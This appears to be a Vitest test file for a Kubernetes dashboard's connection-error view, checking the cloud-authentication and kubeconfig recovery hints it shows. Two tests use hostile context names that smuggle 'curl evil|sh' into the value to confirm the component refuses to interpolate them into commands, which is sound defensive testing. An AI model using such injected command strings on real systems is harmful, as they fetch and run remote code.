import { renderToStaticMarkup } from 'react-dom/server'
import type { ReactNode } from 'react'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import type { ContextInfo } from '../types'

vi.stubGlobal('window', { location: { host: 'localhost:9280' } })

const useContextsMock = vi.hoisted(() => vi.fn(
  (): { data: ContextInfo[] | undefined } => ({ data: undefined }),
))
const capabilitiesMock = vi.hoisted(() => ({ localTerminal: true }))

vi.mock('@skyhook-io/k8s-ui', () => ({
  ClusterName: ({ name }: { name: string }) => <span>{name}</span>,
  useOpenLocalTerminal: () => vi.fn(),
}))
vi.mock('../api/client', () => ({
  useAuthMe: () => ({ data: { authEnabled: false } }),
  useContexts: useContextsMock,
}))
vi.mock('../contexts/CapabilitiesContext', () => ({
  useCapabilitiesContext: () => capabilitiesMock,
}))
vi.mock('./ContextSwitcher', () => ({
  ContextSwitcher: () => <button>Switch context</button>,
}))
vi.mock('./ui/Tooltip', () => ({
  Tooltip: ({ children }: { children: ReactNode }) => children,
}))

import {
  ConnectionErrorView,
  CopyableCommand,
  getAuthRejectedHints,
  selectConnectionHints,
} from './ConnectionErrorView'

function renderError(errorType: string, context: string): string {
  return renderToStaticMarkup(
    <ConnectionErrorView
      connection={{ state: 'disconnected', context, errorType, error: 'safe error' }}
      onRetry={() => {}}
      isRetrying={false}
    />,
  )
}

beforeEach(() => {
  capabilitiesMock.localTerminal = true
})

describe('ConnectionErrorView authentication guidance', () => {
  it('builds an honest EKS diagnostic without presenting it as authentication', () => {
    const context = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
    const hints = getAuthRejectedHints(context)
    const markup = renderError('auth-rejected', context)

    expect(hints.authCommand?.command).toBe(
      'aws sts get-caller-identity && aws eks describe-cluster --name prod --region us-east-1 --query cluster.accessConfig.authenticationMode --output text',
    )
    expect(hints.hideAuthButton).toBe(true)
    expect(markup).toContain('EKS Could Not Authenticate This Request')
    expect(markup).not.toContain('Authenticate in terminal')
  })

  it('does not offer interpolated commands for hostile EKS context values', () => {
    const hints = getAuthRejectedHints('arn:aws:eks:us-east-1;curl evil|sh:123456789012:cluster/prod')

    expect(hints.authCommand).toBeUndefined()
    expect(hints.hideAuthButton).toBeUndefined()
    expect(hints.fallbackCommand?.command).toBe('aws sso login')
  })

  it('does not offer interpolated commands for hostile GKE context values', () => {
    const hints = getAuthRejectedHints('gke_project_us-east1_prod;curl evil|sh')

    expect(hints.authCommand?.command).toBe('gcloud auth login')
    expect(hints.fallbackCommand).toBeUndefined()
  })

  it('selects dedicated guidance for a stuck credential plugin', () => {
    expect(selectConnectionHints('auth-plugin-stuck', 'eks-context')?.title).toBe('Credential Plugin Stopped Responding')

    const markup = renderError('auth-plugin-stuck', 'eks-context')
    expect(markup).toContain('Credential Plugin Stopped Responding')
    expect(markup).not.toContain('aws sso login')
  })

  it('uses the original context for collision-qualified auth guidance', () => {
    const original = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
    const hints = selectConnectionHints('auth', `${original} (secondary)`, original)

    expect(hints?.title).toBe('EKS Authentication Failed')
    expect(hints?.fallbackCommand?.command).toBe(
      'aws eks update-kubeconfig --name prod --region us-east-1',
    )
  })

  it('wires the current context original name into auth guidance', () => {
    const original = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
    useContextsMock.mockReturnValueOnce({
      data: [{
        name: `${original} (secondary)`,
        originalName: original,
        cluster: original,
        user: 'prod',
        namespace: '',
        isCurrent: true,
      }],
    })

    const markup = renderError('auth', `${original} (secondary)`)
    expect(markup).toContain('update-kubeconfig')
    expect(markup).toContain('us-east-1')
  })

  it('renders placeholder AKS commands without a run affordance', () => {
    const markup = renderError('auth-rejected', 'clusterUser_platform_prod')

    expect(markup.match(/aria-label="Run command in terminal"/g)).toHaveLength(1)
    expect(markup).toContain('&lt;cluster&gt;')
    expect(markup).toContain('&lt;rg&gt;')
  })

  it('renders copy-only commands without a run affordance', () => {
    const markup = renderToStaticMarkup(<CopyableCommand command="placeholder" />)

    expect(markup).not.toContain('aria-label="Run command in terminal"')
  })

  it('keeps recovery commands copyable without offering an unavailable local terminal', () => {
    capabilitiesMock.localTerminal = false

    const markup = renderError('auth', 'gke_project_us-east1_prod')

    expect(markup).toContain('Refresh Google Cloud credentials')
    expect(markup).toContain('>gcloud</span>')
    expect(markup).toContain('aria-label="Copy command to clipboard"')
    expect(markup).not.toContain('aria-label="Run command in terminal"')
    expect(markup).not.toContain('Authenticate in terminal')
  })
})

describe('ConnectionErrorView kubeconfig guidance', () => {
  it('keeps the actionable error and context switch visible for a broken context', () => {
    const markup = renderError('config', 'prod')

    expect(markup).toContain('Cannot Load Cluster Configuration')
    expect(markup).toContain('Kubeconfig Problem')
    expect(markup).toContain('aria-expanded="false"')
    expect(markup).toContain('id="connection-raw-error"')
    expect(markup).toContain('safe error')
    expect(markup).toContain('Switch context')
  })

  it('does not offer context switching when no context was loaded', () => {
    const markup = renderError('config', '')

    expect(markup).not.toContain('Switch context')
  })
})
